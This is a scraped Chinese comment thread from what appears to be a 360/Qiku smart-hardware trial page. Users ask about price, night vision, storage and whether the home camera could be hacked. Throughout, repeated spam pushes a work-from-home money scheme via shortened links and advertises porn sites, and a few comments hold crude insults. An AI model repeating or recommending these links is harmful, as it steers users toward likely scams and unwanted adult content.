智能硬件就得做的炫酷。功能其实都差不多。
非常希望能体验一下
这样就可以看我朋友了，需要WiFi吗？ 如果不需要就非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常非常的好了。
好东西 知道拥有
您好，我们的Ghost在手机APP操作时，有自动返航的功能的，Ghost会安全的回到您身边的，请您放心！
非常期待啊
又推新品了，期待中，支持你，我们的360！
我们是做家居安防，远程视频联网报警产品的，欢迎关注试用 QQ896298033
好期待，好像快点拥有
非常想要 希望通过
希望能试用
好棒耶！！！！！
这么好的东西，不给试用太不够意思了！！！
男士福利！搜【欢夜阁】你懂的！女士勿扰！ 
有网络的台式机连上这款产品，手机就可以用吗？不需要密码吗？
对于热爱阅读的人们来说，这是个巨大的好消息。
不需要输入密码就能用吗？
高端大气上档次
不要钱吗？
比我家里的摄像头还要清晰。
家里有老人不放心，有个这东西能时常看到他们的身影就放心多了
期望 1.有夜视功能。 2.有云存储视频图像功能； 可以用来保存查询。设定90天免费，同时可以后期续费作为收入。 3.能加入多个摄像头功能。这样可以用在公司办公以及仓库等环境。 4.支持和儿童手环互通功能。如儿童回家可提示“欢迎宝贝回家”等乐趣提示。 5.可以支持一些旅游公共分享：泰山日出、大海浴场等场景。 祝愿360家庭卫士超越一切类似产品。
360做大做强，顶一个
真的不错，非常希望试用一下
我想问一下 这个 晚上 能看清吗  ，带不带红外功能？ 可不可以360度旋转。这个 供电是怎么弄得
你家光钎是USB接口？进户有四种，一种是ADSL，（需要宽带猫拨号）一种是LAN直接进户（直接拨号不需宽带猫），一种是光钎进户（需要光钎猫进行拨号），一种是闭路线进户（需要广电的闭路终端盒）总之这一系列的进户，都是网线，不是USB，都是有帐号密码拨号的。
看起来好高大上呀   好像拥有呀
期待这样的产品
实时视频  .报警功能.  语音通话. 照看老人。呵护宝贝.沟通家人感情.让我试用吧！！！！！！！！(*^__^*) 嘻嘻…… 
这款产品很漂亮，也很人性化，试用过很多其他产品，同样也希望此次能够有机会试用一下如此美观、实用的东东。
看是好看    就尼玛贵了些
带不带存储啊？怎么没说到
是独立的系统？
这个我要喔
类似暴走鞋，容易摔跤
期待奇酷能率先得到这个产品给大家展示一下。
话说我人品果真已经差到一定的境界了吗？从前年开始经常是遇到试用就填，结果到现在为止还没被选上过。（郁闷）
很期待，选我，选我~！！
希望360越做越好，在国内一定能成为领导者，加油！以前买的360随身wifi2，买了才觉得好，决不后悔，现在我电脑上，手机上全是360的软件，挺你的广仔！
真不错. 来一个!
360的老用户了，已经26级了，很喜欢这类配件，第一次申请试用，希望可以得到，很想将小蜜入手，大力支持
男士福利！搜【欢夜阁】你懂的！女士勿扰！
我最少要买两个装在家里，一楼客厅一个，二楼客厅一下，这样子无论家里的儿子在哪里玩我们都可以看到他，还有家人，每天都可以一目了然，这样在外工作的我就安心多了！谢谢360的产品
今天无意间点进来看到，世上居然还有这货了，我落伍了，看了半天发现，原来就是一个超级缩小版的主机，随便拿到一个有LED显示器的地方接上线就可以用的超级小体型主机，外观确实够迷你的，差不多一小平板，但是配置真不敢恭维，不过说实话体积那么小配置高了，散热绝对是硬伤，鉴定完毕，山里来的孩子以前没见过，大家不要笑我哦 
我也想要~~~我也想要~~~
顶好科技。不知真实操作如何
期待期待期待期待期待期待期待这样的产品.............................
应该是个既可爱又实用好东西，我挺！
男士福利！搜【欢夜阁】你懂的！女士勿扰！
360的老用户了，已经26级了，很喜欢这类配件，第一次申请试用，希望可以得到
=-=， ，，，，，，，，，，，，
此产品是否永久***？
如何购买?为什么我只到了筹钱?
这个是因为天线的问题。 
东西描述的很好，但不知道实际应用是否一样出色？让我们拭目以待吧！
太带感了 otg  内存加大 就更带感了
希望能申请成功啊
骑摩托适合带 
我看成了KFC功能手机壳
想要16G的
人太多了啊  这么多人了啊
东西功能不错
第一次申请，期待中！！！
我对360的产品很有信心，360随身wifi我用过，实用，轻巧，快速，稳定。这次是360家庭卫士我一样看好噢！加油！
每天开车路上非常拥堵想要试试这个产品能不能改变目前的状况
这款产品很漂亮，也很人性化，试用过很多其他产品，同样也希望此次能够有机会试用一下如此美观、实用的东东。 我同意楼上的观点。
360的老用户了，已经45级了，很喜欢这类配件，第一次申请试用，希望可以得到 
男士福利！搜【欢夜阁】你懂的！女士勿扰！ 
夏天可以小范围凉爽，冬天可以小范围取暖，还能小范围干燥或加湿~~好吧，所有“小范围”这个缺点都被炫酷的外观弥补了，功能和空调差不多，但需要实时掌握各地数据，要加WIFI和各类模块。这样看来，价格不会低，应该与一款非常好的空调差不多~~
希望可以申请成功，很期待！~
不错非常好 
这是热胶枪？？！！
太好了我要申请*** 
我们期待你的到来
人眼如果只分黑白，是不是也能节省不少脑容量~
，太棒了，期待试用 
什么时间上市是个问题
男士福利！搜【欢夜阁】你懂的！女士勿扰！ 
是呀，智能产品值得体验！
期待好想试用一下啊
如果能试用的话就好了
看起来不错的样子，就是不知道多少钱才能买得到。
好想试用一下
360哪能和其他相关软件比较啊！360我一直看好，看好360 
0000000000000000000000000000000000000000000
对这个很感兴趣，听说是四百几元，有些太贵，还不如充电宝实际。
好像试用一下真的
希望可以申请成功！！！！期待！！！
求中签啊~~~~~很期待这个东西，非常实用~~~~~~~
太好了，好期待啊！！！
搞什么飞机，乱来 这也太悬殊了吧，为什么
价钱一定是让人只能过过眼瘾了，普通老百姓玩不起这么高级的玩具。
顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶一个
好像有点意思的样子。
我操你妈逼  
不错。智能产品很好。值得推广。
期待！喜欢，希望拥有！
看好这个产品，觉得很实用，觉得未来发展空间大，产品需求量多。很期待这个东西，希望可以申请成功！！！！期待！！！ 
男士福利！搜【欢夜阁】你懂的！女士勿扰！
应该还不错 我想在大厅装一个 书房装一个
有意思好玩 
抓狂啊，气死了
360软件 我一直都很看好
期待着试用成功
非常好的东西 不知道感应灵不灵敏 什么时候出啊 
好酷的样子，一定要买一个
好期待，这款产品听起来就不错。
您好，我们现在有在淘宝上做众筹活动，您可以去淘宝众筹上购买，也可以在我们的为微店上进行购买。非常感谢您的支持！
好吧，我表示我的RP很低。
期待……希望能抽中我
您好，我们现在在淘宝上有做众筹的活动，您可以在那里购买，也可以在微店上进行购买，非常感谢您的支持！
会不会很贵啊？送给小孩子非常棒啊，不再是只能在纸上看到，自己想像的小怪兽可以真实的拿到手里了。期待中！
很期待的小玩意，以后可以理然当然的做懒虫了！哈哈......
男士福利！搜【情乐城】，大家都懂得！男士福利，女生勿入！
好强大好强大 期待
我想说。。是wifi不是wfif。。。有人注意到么。。。
电脑装个软件就可以了  没有必要买产品
其实我并不看好这个产品，机身薄，屏幕大，这都是现在手机的优点，用了这个，就只能呵呵了。并且产品本身如果自带系统的话更加浪费电，还不如一个充电宝，大神们就不能做个可以直接把WIFI信号变成电能的手机外设，谢谢！
掌上看家  一分钱不要
期待哦！好棒的产品！！看好奇酷。。。
相信360的产品
您好，我们现在有在淘宝上做众筹活动，您可以在上面购买，也可以在我们的微店上进行购买，非常感谢您的支持！
期待  希望拥有
男士福利！搜【情乐城】，大家都懂得！男士福利，女生勿入！ 
您好，我们现在有在淘宝上做众筹活动，您可以在上面购买，也可以在我们的微店上进行购买，非常感谢您的支持！
范围太小了，玩游戏不知道适不适合，鼠标会不会飞出范围，如果飞出去可能会砸坏鼠标。准确度会不会因为手压力的问题而变得不准。
我越来越觉得360的一些行为让人恶心。东西都没有，就炒作。吐吐
一直相信360顶啊
很早就有组装手机的念头 
又一神器喜欢
我也是 刚刚试的
  什么时候上架？求试用 真的太传神了   
如果说我出门在外，在没有wi-fi的情况下，我的联通2g卡哪种每秒十几二十几的网络速度，能看得到吗？还有这种的家庭卫士有没有可能被破解，被别人控制，如果有......！！！！！！！！！！
好拉风  求试用
你在逗我吗？只能iPhone才可以用？
不会中酱的
很期待哦！
男士福利！搜【情乐城】，大家都懂得！男士福利，女生勿入！  
有什么  我申请那么多次，一个都没，假的，不可信，
非常期待，奇酷让我感觉非常有潜力，开发出来的产品市场都没见过，而且功能很强大，
普天同庆  皆大欢喜  30个名额有我 真心不容易 感谢奇酷  我会好好写测评的
好期待，好久成功！！
都不中，   有些人都两次了，是不是作弊啊
门口监控防盗,监控小孩老人安全. 
期待啊 ！非常棒的东东！ 顶啊 ！！！
这个产品做出来了嘛？
好喜欢，外形可以定做的话会更好，外壳质感可以是金属拉丝的吗
打印个iPhone出来装逼
我是最有爱的分母~
妥妥的，同意
男士福利！搜【情乐城】，大家都懂得！男士福利，女生勿入！
终于等到了这样期待已久的神器！！！
400 美元？太贵了吧。。
怎么说也不过就是个MP3...
我想很多如果有一天有人高手黑客，可以破解看到家庭。怎么办？
360是安全公司  请放心 没那么容易哈
感觉好鸡肋。。。
创意不错         有了这个  夫妻俩不在一块也。。。。    哈哈哈
错别字都已经改了，sar值0.691，远低于一般的手机。
噗。。。在Ctrl键上写个双击搜索就可以变成新产品拿出来卖了。。。
万一呢？如果高手黑客可以看到，并360安全公司不知道黑客在看看呢？360安全公司保证是安全吗？
http://item.taobao.com/item.htm?spm=a1z10.1.w137644-2405369549.47.VJQLeX&amp;id=38867331471 随便上个链接。立即购买的官网右上角有个商城，淘宝网有卖这个开关。
= =！链接屏蔽了么、。。
什么时候嫩让我们***，期待
官网右上角有个商城按钮，点进去右三个，有个是淘宝，淘宝有卖这个开关
噗。。。关键字都屏蔽了么。。。官网的右上角有个商城，自己找下吧。。。
官网右上角有个商城，自己找下，可以买的。99-119左右
目前的所有计步类手环都是通过重力感应器来计算步数，手表也是这样，它根据重力加速度变化，辅以人的身高、体重、年龄等信息来判断步数。所以，只要猛烈晃荡，也会被判断为步数变化。 电池的容量跟体积大小有关，并且手表中有2G芯片、gps芯片、wifi芯片、重力感应芯片、蓝牙芯片，本身耗电就会比只采用重力感应芯片和蓝牙芯片的运动手环就要多。但是我们再软件上做了很多优化措施，把工作状态下的续航延长到了48小时。
还有这种的家庭卫士有没有可能被破解，被别人控制，担心的有理，支持！
期待期待 每天生活在不干净的空气里
男士福利！搜【情乐城】，大家都懂得！男士福利，女生勿入！ 
非常期待，小孩调皮也不怕了
期待啊 ！非常棒的东东！ 顶啊 ！！！  
太棒了，太需要这样的产品了。几乎每个有老人和小孩的家庭都需要，360真是良心企业啊。即使没有我的资格，也请尽快上市能买上一个。谢谢。
期待中 啦啦啦啦啦
这个。。。也需要创意中么。。。几天时间就完成了吧。。。
买这个彰显贵族身份啊。。。
= =！android不是根据linux开发的么
放在家门外？会被偷走吧。。。
希望性能强点吧
root一下不还是一样？
听好玩的。。
不过掉地上扔掉什么的会不会坏掉。。刚才看我还以为是扔出去可以记录轨迹。。。
都已经量产了，能给个具体的上市发售的时间不？
可以拿来切菜么
看起来很不错的样子
好想来一个啊    这款产品    做出来了没
期待期待期待 
物美有了    价廉 有木有        ！！！
防丢卫士丢了会有警报的好么。。。
同感，我们这些没有作图天赋的渣渣，甚感好奇和向往的同时也深感无力呀，哈哈！建议小编去看看别人的试用报告那里有不拉丝的使用窍门！
这个够深入，比较有文采，通俗易懂！
    柯南！！！
要是能便宜点就更好了
户外卫士没有吗？
不知道价格怎么样？
感觉好科幻，很期待产品上市，体验一把！
我是没有看到这个摄像头有储存的功能，现在市面上其他这类的摄像头都是可以插一张TF卡的，然后大概可以存个一天这样子视频内容，360这个好像没看到啊， 到时候断网了，不就等于废品一个，啥用都没有了？而且也没有手机控制转动的功能，只有一个广角120°，看来bug还是挺多的呀~
我想知道零售价是多少，如果价位适当大家可以买一个试用
第一次关注，希望能中招
每次都有这人？
给我一个试用的吧，老公戴着它钓鱼一定非常方便！
这么给力的宝贝，真是太棒了。
目前让我来购买肯定是买不起的，但这些宝贝只有在以前的电影中看到，现在的高科技把它比电影中“请”了出来，真的很高兴。
我这么难中试用？就是申请人太多了导致、。、：（
那你就不要连网啊，手机也不用啊，任何连入网络的终端都有机会被破解 人家心脏起搏器都能被黑了，还有什么不能被黑？！
360便宜没好货，感觉没有ithink的手立视好，分享个链接http://item.jd.com/1080134.html 不谢，叫我活雷锋！
没有ithink的手立视好，360便宜没好货！http://item.jd.com/1080134.html
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入!
我也来申请，看看效果如何啊。。。。。
好高科技啊！
这个不错，很喜欢，什么时候可以试用
觉得很好，很有创意，360，智能家居的首位发起者！
我看了一下 现在网上有用手机卡的，其实可以介于这两种连接，这样会更好特别是农村没有无线时用手机卡更好。
可以的话，能够弄一个手表式的数据统计 就可以不用手机了
能录像吗？录完像存储在什么地方？带存储卡？ 是否可以录像后自动存储在云盘里面？
是否可以录像后自动存储在云盘里面？ ？？？？ 
是否可以录像后自动存储在云盘里面？
小编，给我一个~~ 
有意思，很不错。
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入! 
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入! 
拍照水准有待提升啊
我是来攒人品的!
我去，真的非常长，我竟然没有注意！！！！！！
手机拍的，还木有专业的拍照工具
如果说我出门在外，在没有wi-fi的情况下，我的联通2g卡哪种每秒十几二十几的网络速度，能看得到吗？还有这种的家庭卫士有没有可能被破解，被别人控制，如果有......！！！！！！！！！！ 呗别人控制那就麻烦了    如果手机中病毒被别人看到摄像头那几麻烦大了  有多了一个门故事了
（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
写得还不错。
神器！值得入手
好厉害！32个赞！
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～ 
真不是。。。
早就想要这种东西了
很想要一个这东东，希望能中一个啊
刚入手爱车，很需要一个这样的东东
必须要买的东东，妈妈再也不用担心ipad找不见了！
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～ 
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～ 
有试用吗，我想试下
有产品试用吗？来个试用下
如果可以录像后自动存储在云盘里面，那就更完美了 
孩子真的很需要
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o， 我详细作讲解～  
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入! 
就是将设备中的音乐通过WiFi连接到带Dock的音箱上，还不如直接WiFi连接到音箱上。
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
 （宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
简洁大方，漂亮
我觉的这个产品很实用，孩子在外边上学父母能随时知道动向心里会很踏实，我认为在外边上小学的孩子是需要的
功能介绍不清楚，希望能再详细
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入!  
不发售，你这白话个毛啊
系统说首日申请突破6万人，看来确实是抢手货，也是大家想要的，希望我能得到
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o， 我详细作讲解～  
（宝妈、学生、 上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
什么时间开始卖啊   我想买一个
请问这东西什么时候出来，hold不住了。 如果价格可以接受， 买一大堆，身边小物件神马都绑一个，尤其是钥匙，再也不怕丢失了。
（宝妈、学生、上班族都可以）做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
什么时候有的卖，多少钱
这个东西如果安装一个指示灯的话，在晚上找东西更方便
好像要一个 
好想要一个
好想要一个
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入!  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o， 我详细作讲解～  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我  ～ ～每夭5o~15o，我详细作讲解～  
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入! 
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细 作讲解～  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
好想要一个 但愿能被选中
垃圾产品,sb顾小可
顾小可你妈是托 
我都说过了,迟迟不上市是价格的问题
企业能否使用，当监控使用，望工程师提供企业安全解决方案
婊子，小学生穿什么穿
建议做国际通用接口和iPhone接口两个版本！
黑色不错！
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o， 我详细作讲解～  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～  ～每夭5o~15o，我详细作讲解～  
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入!  
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入!  
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入!  
我还以为电影上才会有，没想到在这里真能看得到
没看到发售，试用却又抢不到，真失落
因没有仔细看功能，价格选错了。300左右可以接受！！！
这么高科技的背后我似乎看到他的造价不菲，而且他的装饰作用似乎大于他的实际作用，尽管如此我还是非常期待这款产品的面世，不为什么，就因他炫酷的外表浓浓的科技感和时尚感。如果价格合理，我非常乐意去购买这么一款产品。
能不能别这么别这么自私呀....... 
发售当天，我抢购到一个了，现在天天在使用中，总体来说挺不错的，但有些不解的问题老出现。 1、插在XP系统电脑上不拨，每天就直接开电脑使用U盘，但就会有时电脑开不了机，要把U盘拨后才可开机。 2、我用另外一台装有监控系统的电脑上使用此U盘，并把U盘开启WIFI功能，在那种情况下会导致我的监控系统软件搜索不到摄像机。必须把U盘拨掉后监控系统马上正常了。
还有一个问题就是，U盘发热太厉害了，不敢存放重要数据在里面，担心哪天出问题。
这种东西我已经看到有部分在用了，看着他们用着挺好，哪天有机会也让我试试
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我 详细作讲解～  
（宝妈、学生、上班族都可以） 做的越多 挣的越多～【dwz.cn/gkvFd】 复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～  
现今社会治安确实太乱了，这种东西要得以普及推广更好
这款高科技产品真心好，希望能得到，360活动真多，就是中奖率不高，哪天幸运会降临呢，期待……
感觉太过夸张了
这要能中简直就是夸克撞动地球。
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入! 
宅男福利！搜【情乐城】大家都懂得！男士福利！女生勿入!  
这种即时3D显示技术似乎有些鸡肋，看起来很炫，但是实际却没有多大的作用。正面的四枚摄像头让手机的美观大打折扣，就像一个多目怪，其中导致的成本增加，又转移到售价上，让用户承担，这么做仅仅是为了展现自己的与众不同？额.....不太看好这款设备。以上只是个人观点。
如果价格合适，还是非常期待的。这一类产品价格太高就会变得难以推广。
这多人申请啊，要是我能中我立马去买双色球。
不仅可以美化室内环境，还可以尝到自己亲手栽培的蔬菜，非常好的创意。只是199美元的价格似乎需要考虑考虑。
不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～ 每夭5o~15o，我详细作讲解～
 不限制工作时间，（宝妈、学生、上班族都可以）做的越多挣的越多～【dwz.cn/gkvFd】复制到 浏览器打开 ～有意博客联系我 ～ ～每夭5o~15o，我详细作讲解～
提了N条建议，希望这次能中签
提的建议很多，期待能中签
朴素简约的风格，个人非常喜欢。不管实际用途大不大，即使作为桌面上的装饰我也愿意为其破费。额....有些冲动啊，但是真的非常漂亮，还可以当做小礼物送给朋友。
跟酷乐视比做工和整体质量不能差，价格能比他们便宜就一定会有市场的 
（宝妈、学生、上班族都可以）～【dwz.cn/gkvFd】复制到 浏览器打开 ～博客联系我 ～ ～每夭5o~15o，我详细作讲解～
（宝妈、学生、上班族都可以） ～【dwz.cn/gkvFd】复制到 浏览器打开 ～博客联系我 ～ ～每夭5o~15o，我详细作讲解～ 
（宝妈、学生、上班族都可以）～【dwz.cn/gkvFd】复制到 浏览器打开 ～博客联系我 ～ ～ 每夭5o~15o，   我详细作讲解～ 
男士福利！女女勿进！直接复制进入《www.hulai.pw》都懂的
男士福利！女女勿进！直接复制进入《www.hulai.pw》都懂的 
感觉好高科技呀！
（宝妈、学生、上班族都可以）～【dwz.cn/gkvFd】复制到 浏览器打开 ～博客联系我 ～ ～ 每夭5o~15o， 我详细作讲解～ 
（宝妈、 学生、上班族都可以）～【dwz.cn/gkvFd】复制到 浏览器打开 ～博客联系我 ～ ～ 每夭5o~15o， 我详细作讲解～ 
 （宝妈、学生、上班族都可以）～【dwz.cn/gkvFd】复制到 浏览器打开 ～博客联系我 ～ ～ 每夭5o~15o， 我详细作讲解～ 
个人觉得外观不真么样，当然作为一个路由器应该以实用为主
超级喜欢，希望可以试用一下
一定买，，，希望更实用一些
啊呀，赶紧上市开卖啊。这东西可以放在店里。前几天商店被盗了。有了这东西，能够侦测物体移动，晚上关门之后，不怕贼了。
感觉第二代没第一代好看…………特别是那个扬声器，弄成和产品同色的不好么，变得有点突兀……
男士福利！女女勿进！直接复制进入《www.hulai.pw》都懂的
男士福利！女女勿进！直接复制进入《www.hulai.pw》都懂的 
非常期待哦 这个如果价格像360WiFi一样的话 会红动全国
灰常期待中……
已经在 官方网站 中奖
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～
男士福利！女女勿进！直接复制进入《www.hulai.pw》都懂的  
男士福利！女女勿进！直接复制进入《www.hulai.pw》都懂的  
一直信赖360产品和软件，很期待360的产品。支持360~！
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～ 
出行路况必备
有种身临科幻片的感觉，不过很期待
感觉很不错，如果投影能换个方向投向胳膊而不是手背，效果可能更好~
外形设计的很有味道。希望能尽早出来让我们体验
价钱有些贵...不过很期待
几十块钱可以考虑入手
今天申请试用了，不知道怎么提高中奖机会
旋转支架是否需要手动才能观看周围情况？谢谢
诺基亚所有的Lumia，Windows Phone8.1，支持蓝牙4.0了，你能不能对我们支持一下么？
卖贵了，略坑
虽然比想象中的打了点。但是还是很想要
另外，该产品的广角覆盖区域是多大？
现在都是火星车了，这车老掉牙了。。。
创意很好，价格要亲民啊，不然爱丢三落四的人家里空调遥控帖一个、电视遥控挂一个、机顶盒遥控挂一恶搞、钱包挂一个、钥匙挂一个……土豪才挂得起啊
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
外形非常吸引，功能也很强大，很实用的东西，高科技产品，销量会很好的，好像颗夜明珠啊，真的非常想要一个啊，期待中
气愤，还是即将发售！
这第一个问题我在U盘里遇见过 原因是应为主板设置开机优先使用外部储存设备加载系统 你U盘里没有系统 所以开机时候会加载u盘 寻找u盘里的系统    可能会跟这个有关系
你娘的说的也太吓人了
说得对啊...
我们的可以自动或手机电脑控制旋转 想看哪就看哪
我们公司都出几年了 监控专用 
这个没有我们公司的好用，比360家庭卫士多几个功能：1、支持插卡录像功能，电脑不需要开机就能录像，2、可以无线也可以接网线，高清画面链接网络远程才流畅，3、可用电脑和手机远程控制左右上下旋转，4、可以远程回放录像，有需要的朋友可以加我  
好想要一个 但愿能被选中  这个没有我们公司的好用，比360家庭卫士多几个功能：1、支持插卡录像功能，电脑不需要开机就能录像，2、可以无线也可以接网线，高清画面链接网络远程才流畅，3、可用电脑和手机远程控制左右上下旋转，4、可以远程回放录像，有需要的朋友可以加我   
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～  
～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
我每一期都参加，呵呵，每期都是路人甲，没有抽中过，还在坚持支持中。
非常非常之期待..... 
www.123wocao.com你懂的
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，  我详细作讲解～  
～～（宝妈、学生、 上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
赶紧出吧....非常需要的东西
想要，有了这个我妈就藏不了我ipad了【用保护套夹住】做薄点ou
不错，随然名额比较少，但希望有机会试用。
好东西！！！！1
防丢卫士供电问题怎么解决？
都是我很需要的功能，方便照顾老人。虽然名额不多，好希望能够筛选上，有机会试用。
～～（宝妈、学生、 上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我 详细作讲解～  
～～（宝妈、学生、 上班族都可以） 【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
～～（宝妈、学生、 上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
真是缺钱花啊
您好，请问一下您买的飞机ID是多少，我们这边好登记您的资料，我们以后会出很多优惠活动的，尽量给您优惠，您觉得可以吗？
这是一个监视器，孩子走到哪都知到，小孩没隐私了！！！！！！！！！！！！！！！！！！！！
俺也是这么想的，外观更具伪装性好一些
名额太少了，说实话我大学专业就是电子信息类，现在在公司做技术类工作，对电子产品的使用安装很在行。以前是通过报废的安卓手机，安装一个“掌上看家”的软件来实现这个功能，现在新产品出来了，很期待可以试用
嘎嘎.....很想要啊！！！！
很期待试用产品
男士福利！女女勿进！直接复制进入《www.hulai.pw》都懂的
男士福利！女女勿进！直接复制进入《www.hulai.pw》都懂的 
这个可以加入指南针或者天气功能，把它加强为一个室外用的专业手表
我也好想要
～～（宝妈、学生、 上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o， 我详细作讲解～  
